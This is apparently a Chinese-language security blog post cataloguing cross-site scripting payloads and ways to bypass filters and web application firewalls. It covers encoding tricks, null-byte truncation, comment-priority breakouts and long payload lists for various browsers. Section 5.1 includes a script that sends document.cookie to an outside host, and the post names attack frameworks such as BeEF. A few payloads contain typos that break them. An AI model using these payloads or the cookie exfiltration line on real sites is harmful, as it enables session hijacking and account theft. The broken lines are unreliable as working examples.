---
layout: post
title: XSS防护bypass
author: alpha1e0
categories: 安全技术
tages: 安全技术
---

## 1 前言

XSS攻击和场景相关性非常大，且难以防御，本文介绍XSS攻击bypass相关的内容。

---

## 2 XSS payload出现的位置

### 2.1 标签之间

可以插入完整的HTML语句，例如
	
	<p> ... <img src=x onerror=alert(1)> ... </p>

### 2.2 标签属性

HTML属性大致可分为普通属性、资源类属性、onxx事件属性

例如XSS payload 出现在value属性、href/src等属性、onxx属性中

### 2.3 JavaScript中

### 2.4 CSS中

---

## 3 XSS payload相关HTML元素

XSS payload有以下两种形式：

	<script src=attack_payload_url>attack_payload</script>
	<label onxxx=attack_payload attr=javascript|data:attack_payload></label>

第一种形式缺少变化；第二种形式则有很多变化，有很多标签可以使用，每种标签有很多属性和事件可以使用。*下面主要介绍第二种形式*

### 3.1 标签

#### 3.1.1 所有标签

	<a> <abbr> <acronym> <address> <applet> <area> <article> <aside> <audio> <b> <base> <basefont> <bdi> <bdo> <big> <blockquote> <body> <br> <button> <canvas> <caption> <center> <cite> <code> <col> <colgroup> <command> <datalist> <dd> <del> <details> <dir> <div> <dfn> <dialog> <dl> <dt> <em> <embed> <fieldset> <figcaption> <figure> <font> <footer> <form> <frame> <frameset> <h1> <head> <header> <hr> <html> <i> <iframe> <img> <input> <ins> <isindex> <kbd> <keygen> <label> <legend> <li> <link> <map> <mark> <menu> <menuitem> <meta> <meter> <nav> <noframes> <noscript> <object> <ol> <optgroup> <option> <output> <p> <param> <pre> <progress> <q> <rp> <rt> <ruby> <s> <samp> <script> <section> <select> <small> <source> <span> <strike> <strong> <style> <sub> <summary> <sup> <table> <tbody> <td> <textarea> <tfoot> <th> <thead> <time> <title> <tr> <track> <tt> <u> <ul> <var> <video> <wbr> 

#### 3.1.2 不会执行JavaScript的标签

	<title> <textarea> <xmp> <noscript> <noframe> <plaintext>

#### 3.1.3常用执行JavaScript的标签

	<script> <a> <p> <img> <body> <button> <var> <div> <iframe> <object> <input> <select> <textarea> <keygen> <frameset> <embed> <svg> <math> <video> <audio> <meta> <marqee> <isindex>


### 3.2 on事件

#### 3.2.1所有on事件

	onafterprint onbeforeprint onbeforeunload onerror onhaschange onmessage onoffline ononline onpagehide onpageshow onpopstate onredo onresize ondrag ondragend ondragenter ondragleave ondragover ondragstart onmousewheel onscroll oncanplay oncanplaythrough ondurationchange onemptied onended onerror onloadeddata onloadedmetadata onloadstart onpause onplay onplaying onprogress onratechange onreadystatechange onseeked onseeking oonstalled nsuspend ontimeupdate onvolumechange ondrop onstorage onundo onformchange onforminput oninput oninvalid

#### 3.2.2 常用on事件

	onclick onfocus(autofocus) onmousemove onload onunload onchange onsubmit onreset onselect onblur onabort onkeydown onkeypress onkeyup ondblclick onmouseover onmouseout onmouseup onmousedown onforminput onformchange ondrag ondrop


### 3.3 伪协议

#### 3.3.1 伪协议属性

	src href data formaction action code

	<applet> <embed> <frame> <iframe> <img> <input type=image> <xml> <a> <link> <area> <table|tr|td background> <bgsound> <audio> <video> <object> <meta refresh> <script> <base> <source>

#### 3.3.2 伪协议使用

	action|formaction|src|href|data|code=javascript:alert(1)
	action|formaction|src|href|data|code="data:text/html,<script>alert(1)</script>"
	action|formaction|src|href|data|code="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="

	href: <a href=xx>
	src: <iframe|img|video|audio|embed src=xx>
	action: <form action=xx><input type=submit>
		<isindex action=xx type=image>
		<input type=image action=xx> //firefox未验证通过
	formaction: <isindex formaction=xx type=image>
		<button formaction=xx> //firefox未验证通过
		<input type="image" formaction=xx> //firefox未验证通过
	data: <object data=xx>
	code: <applet code=xx> //firefox
		<embed  code=xx>

### 3.4 其他

	<table background=javascript:alert(1)></table> // 在Opera 10.5和IE6上有效
	<applet code="javascript:confirm(document.cookie);"> // Firefox有效

### 3.5 自动触发事件

	<img src=1 onerror=alert(1)> <a ..> <video ..> <audio ..>

	<input autofocus onfocus=alert(1)> <select ..> <textarea ..> <keygen ..>
	<input onblur=alert(1) autofocus><input autofocus>
	<body onscroll=alert(1)><br>....<br><input autofocus>
	<a onmousemove=alert(1)>

	<xml onreadystatechange=alert(1)> <style ..> <iframe ..> <script ..>
	<object onerror=alert(1)>
	<object type=image src=valid.gif onreadystatechange=alert(1)></object> <img ..> <input ..> <isindex ..>
	<bgsound onpropertychange=alert(1)>
	<body onload=prompt(1);>
	<body onbeforeactivate=alert(1)>
	<body onactivate=alert(1)>
	<body onfocusin=alert(1)>
	<body onhashchange=alert(1)>

	<svg onload=prompt(1);>
	<marquee onstart=confirm(2)>/
	
	<video><source onerror="javascript:alert(1)">

---

## 4 XSS bypass filter/waf

XSS的防护有净化、过滤两种方式：

1. 净化。过滤对关键符号**;\/<>"'=**进行转义，或者对关键字进行替换例如script替换为sc。一般在APP上实现
2. 过滤。匹配关键字后丢弃报文或连接。一般为安全软件、设备

对于这两种防护手段，都需要**匹配关键字**，因此都有相同的两种bypass思路，在加上bypass实现机制，可得：

1. 对关键字进行变形，从而绕过关键字匹配。
2. 弃用关键字。使用关键字的同义结构。例如过滤script标签，可以使用img标签代替
3. 根据代码实现机制设计绕过方式

### 4.1 关键字变形

HTML标签的几个重要位置如下：

	< img src = " aa.jpg "  onmousemove=alert(1) x=a>
	 1 2 3 4 5 567   8  7  9     4        8

**各个位置的变换方法如下：**

#### **位置1**的变换


#### **位置2**的变换

> 插入%00截断，仅在IE中有效

	<img onmousemove=alert(1) src=>  --->  <im%00g onmousemove=alert(1) src=>

> 大小写变换
> URL编码

#### **位置3**的变换

> '/'符号可以充当分割符
> '/somewords/'可以充当分隔符
> 空格可使用0x09 0x0a 0x0c 0x0d替换，firefox可用
> URL编码

#### **位置4**的变换

> 大小写变换
> URL编码

#### **位置5**的变换

> 可插入空格
> 可插入0x09 0x0a 0x0c 0x0d，firefox可用

#### **位置6**的变换

> 单引号，双引号
> 在ie中可使用反引号代替
> 如果没有空格则不需要引号
> URL编码

#### **位置7**的变换

> 可插入空格
> 可插入0x09 0x0a 0x0c 0x0d，firefox有效

#### **位置8**的变换

> HTML编码，HTML实体编码可以方式**&#111**或**&#x6c**，分别是十进制方式和十六进制方式

	<img src=1 onmousemove=alert(1)> ---> <img src=1 onmousemove=a&#x6c;ert(1)>

> unicode编码，

	<a onclick=javascript:alert(1)>aaa</a> ---> <a onclick=javascript:al\u0065rt(1)>aaa</a>

> URL编码
> 如果是javascript执行域（如伪协议中），则可以使用javascript相关编码


#### **位置9**的变换

> 空格符
> 0x09 0x0a 0x0c 0x0d可从当分割符，firefox可用
> 如果前面的属性有分号封闭，则无需空格
> URL编码

#### 其他

> 使用%3Cscript%3E**String.fromCharCode**%3C%2fscript%3E

> 使用throw 1绕过括号被过滤:

	<img src=x onerror="javascript:window.onerror=alert;throw 1">
	<a onmouseover="javascript:window.onerror=alert;throw 1>

> 绕过圆点过滤，alert(document['cookie'])，with(document)alert(cookie)

> 使用eval，eval('al'+'ert(1)')，如果eval被过滤，使用setTimeout/setInterval代替

备注：

* URL编码

URL编码使用16进制编码方式**%xx**，URL中的特殊字符**!*'();:@&=+$,/?#[]**必须编码，另外所有其他字符都可以进行编码，
URL编码内容可参阅[这篇文章][1]

URL中空格可以用'+'加号代替

	<img onmousemove=alert(1) src=>  --->   <img onm%6f%75%73%65move=alert(1) src=>
	<script>alert(1)</script> --->  %3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e

* javascript编码

8、16进制编码，unicode编码，如下：

	'<' ---> \74(8进制) ---> \x3c(16进制)
	'<' ---> \u003c(jsunicode)



### 4.2 使用同义词

第3节中的方法可以相互组合替换

alert,prompt,confirm可互相替换


### 4.3 bypass实现机制

1. 超长字符串

通过提交超长的参数bypass过滤防护机制

2. 善用优先级bypass防护策略

HTML中有注释的优先级最好可以闭合其他一切，一些标签的优先级比其他优先级大，例如textarea title style script xmp优先级较高可闭合低优先级标签。例如：

	<!--<a href="--><img src=x onerror=alert(1)//">test</a>
	<title><a href="</title><img src=x onerror=alert(1)//">
	<? foo="><script>alert(1)</script>">
	<! foo="><script>alert(1)</script>">
	</ foo="><script>alert(1)</script>">
	<% foo="%><script>alert(1)</script>">

---

## 5 XSS attack payload

### 5.1 常用XSS语句

HTML组件：

	<script>alert(1)</scritp>
	<a href=javascript:alert(1)>aaa</a>
	<iframe src="javascript:alert(2)">
	<video/audio/img src=x onerror=prompt(1);>
	<img onmousemove=alert(1) src=>
	<img/µ/a\:script/src=x onerror=alert(1)//>

	<form action="Javascript:alert(1)"><input type=submit>
	<isindex action="javascript:alert(1)" type=image>
	<form><button formaction=javascript&colon;alert(1)>CLICKME
	<select/keygen/textarea autofocus onfocus=alert(1)>
	<a onmouseover=location='javascript:alert(1)'>click

	<aaaaa onclick=alert(1) src=x>click
	<LԱ onclick=alert(1)>click me</LԱ>
	<svg><script>alert&#40/1/&#41</script>
	<input oninput=alert(1)>

*for IE*

	<bgsound onpropertychange=alert(1)>
	<body onpropertychange=alert(2)>
	<body onmove=alert(3)>
	<body onfocusin=alert(4)>
	<body onbeforeactivate=alert(5)>
	<body onactivate=alert(6)>
	<embed onmove=alert(7)>
	<object onerror=alert(8)>
	<style onreadystatechange=alert(9) >
	<xml onreadystatechange=alert(10) >
	<xml onpropertychange=alert(11) >
	<table><td background=javascript:alert(12) > 
	<scri%00pt>alert(1);</scri%00pt>
	<video poster=javascript:payload>
	<input style=background:url("javascript:alert(1);") />
	<input style="cos:expression(if(!window.x){alert(document.domain);window.x=1;})" />

攻击payload:

	var i=document.createElement('img');i.src='http://webpentest.sinaapp.com/?p='+document.cookie;document.body.appendChild(i)


### 5.2 常见attack framework

* attack api
* beef
* xss-proxy
* xss shell

---

## 6 其他

	<img src= alt=" onerror=alert(1)//"> 突破scr属性的引号转义，提交“ alt=" onerror=alert(1)//"”



## 7 引用

[url编解码][1]

[bypass waf filter][2]

[html编码][4]

[html sec][5]

[1]: http://www.ruanyifeng.com/blog/2010/02/url_encoding.html
[2]: http://www.freebuf.com/articles/web/20282.html
[3]: http://drops.wooyun.org/tips/845
[4]: http://drops.wooyun.org/tips/147
[5]: http://html5sec.org/